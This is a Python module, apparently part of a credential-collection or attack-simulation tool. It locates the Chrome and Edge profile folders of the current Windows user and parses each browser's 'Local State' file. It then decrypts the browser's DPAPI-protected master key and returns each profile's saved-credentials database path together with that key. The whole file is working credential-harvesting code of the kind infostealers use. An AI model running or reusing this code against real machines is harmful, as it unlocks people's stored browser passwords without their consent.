import base64
import getpass
import logging
import os
from dataclasses import dataclass
from pathlib import Path
from typing import Any, Collection, Dict, Optional, Set

from .chrome_browser_local_data import (
    ChromeBrowserLocalData,
    ChromeBrowserLocalState,
    read_local_state,
)
from .utils import BrowserCredentialsDatabasePath
from .windows_decryption import win32crypt_unprotect_data

logger = logging.getLogger(__name__)

DRIVE = "C"
LOCAL_APPDATA = "{drive}:\\Users\\{user}\\AppData\\Local"

WINDOWS_BROWSERS_DATA_DIR = {
    "Chromium Edge": "{local_appdata}/Microsoft/Edge/User Data",
    "Google Chrome": "{local_appdata}/Google/Chrome/User Data",
}


@dataclass(kw_only=True)
class WindowsChromeBrowserLocalState(ChromeBrowserLocalState):
    master_key: Optional[bytes] = None


class WindowsChromeBrowserLocalData(ChromeBrowserLocalData):
    def __init__(self, local_data_directory_path: Path, profile_names, master_key):
        super().__init__(local_data_directory_path, profile_names)
        self._master_key = master_key

    @property
    def master_key(self) -> Optional[bytes]:
        return self._master_key


def create_windows_chrome_browser_local_data(
    local_data_directory: Path,
) -> WindowsChromeBrowserLocalData:
    local_state = WindowsChromeBrowserLocalState()
    with read_local_state(local_data_directory / "Local State") as local_state_object:
        local_state = _parse_windows_local_state(local_state_object)

    return WindowsChromeBrowserLocalData(
        local_data_directory, local_state.profile_names, local_state.master_key
    )


def _parse_windows_local_state(local_state_object: Any) -> WindowsChromeBrowserLocalState:
    local_state = WindowsChromeBrowserLocalState()
    try:
        local_state.profile_names = set(local_state_object["profile"]["info_cache"].keys())
        encoded_key = local_state_object["os_crypt"]["encrypted_key"]
        encrypted_key = base64.b64decode(encoded_key)
        local_state.master_key = _decrypt_windows_master_key(encrypted_key)
    except (KeyError, TypeError):
        logger.error("Failed to parse the browser's local state file.")
    return local_state


def _decrypt_windows_master_key(master_key: bytes) -> Optional[bytes]:
    try:
        key = master_key[5:]  # removing DPAPI
        key = win32crypt_unprotect_data(key)
        return key
    except Exception as err:
        logger.error(
            "Exception encountered while trying to get master key "
            f"from browser's local state: {err}"
        )
        return None


class WindowsCredentialsDatabaseSelector:
    def __init__(self):
        user = getpass.getuser()
        local_appdata = LOCAL_APPDATA.format(drive=DRIVE, user=user)
        local_appdata = os.getenv("LOCALAPPDATA", local_appdata)

        self._browsers_data_dir: Dict[str, Path] = {}
        for browser_name, browser_directory in WINDOWS_BROWSERS_DATA_DIR.items():
            self._browsers_data_dir[browser_name] = Path(
                browser_directory.format(local_appdata=local_appdata)
            )

    def __call__(self) -> Collection[BrowserCredentialsDatabasePath]:
        """
        Get browsers' credentials' database directories for current user
        """

        databases: Set[BrowserCredentialsDatabasePath] = set()

        for browser_name, browser_local_data_directory_path in self._browsers_data_dir.items():
            logger.info(f'Attempting to locate credentials database for browser "{browser_name}"')

            browser_databases = (
                WindowsCredentialsDatabaseSelector._get_credentials_database_paths_for_browser(
                    browser_local_data_directory_path
                )
            )

            logger.info(
                f"Found {len(browser_databases)} credentials databases "
                f'for browser "{browser_name}"'
            )

            databases.update(browser_databases)

        return databases

    @staticmethod
    def _get_credentials_database_paths_for_browser(
        browser_local_data_directory_path: Path,
    ) -> Collection[BrowserCredentialsDatabasePath]:
        try:
            local_data = create_windows_chrome_browser_local_data(browser_local_data_directory_path)
        except Exception:
            return []

        master_key = local_data.master_key
        paths_for_each_profile = local_data.credentials_database_paths
        return {
            BrowserCredentialsDatabasePath(database_file_path=path, master_key=master_key)
            for path in paths_for_each_profile
        }
